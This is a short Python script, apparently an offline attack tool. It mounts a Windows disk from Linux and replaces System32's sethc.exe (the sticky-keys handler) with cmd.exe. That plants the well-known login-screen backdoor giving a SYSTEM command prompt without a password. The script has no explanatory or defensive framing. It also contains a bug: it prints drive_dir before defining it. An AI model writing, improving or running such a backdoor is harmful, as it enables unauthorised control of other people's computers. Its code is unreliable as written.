
import sys
import os
import shutil

sys32 = "/rham/Windows/System32"

print("drive_dir: "+ drive_dir) 

#mount localdisk:
os.system("mkdir /rham")
os.system("mount /dev/sda3 /rham")
os.system("sudo mount -o remount,rw /dev/sda3 /rham")
drive_dir = "/rham"

files = os.listdir(drive_dir)

for folder in files:
    print(folder)
    is_windows = os.path.isdir(sys32)
    if is_windows == False:
        continue
    else:
        break

cmd = sys32 + "/cmd.exe"
sethc = sys32 + "/sethc.exe"
old_sethc = sys32 + "/sethc0.exe"

print("cmd: " +cmd)
print("sethc: " + sethc)
print("old sethc: " + old_sethc)

os.rename(sethc, old_sethc)
shutil.copyfile(cmd, sethc)
